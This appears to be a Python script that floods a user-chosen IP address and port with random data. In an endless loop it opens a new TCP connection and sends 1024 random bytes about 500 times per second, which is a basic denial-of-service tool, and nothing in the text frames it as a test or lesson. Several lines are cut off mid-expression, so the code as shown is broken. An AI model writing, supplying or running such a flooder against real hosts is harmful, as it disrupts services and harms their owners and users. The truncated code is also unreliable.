import random
import string
import socket
import time

def generate_random_data(size):
    characters = string.ascii_letters + string.digits + strin>
    data = ''.join(random.choice(characters) for _ in range(s>
    return data.encode()

def send_random_data(target_ip, target_port, data):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.sendall(data)
    s.close()

target_ip = input("Enter the target IP address: ")
target_port = int(input("Enter the target port: "))
data_size = 1024  # Packet size in bytes

interval = 1 / 500  # Time interval between each packet (1 se>

try:
    while True:
        random_data = generate_random_data(data_size)
        send_random_data(target_ip, target_port, random_data)
        time.sleep(interval)
except KeyboardInterrupt:
    print("Program stopped by user.")
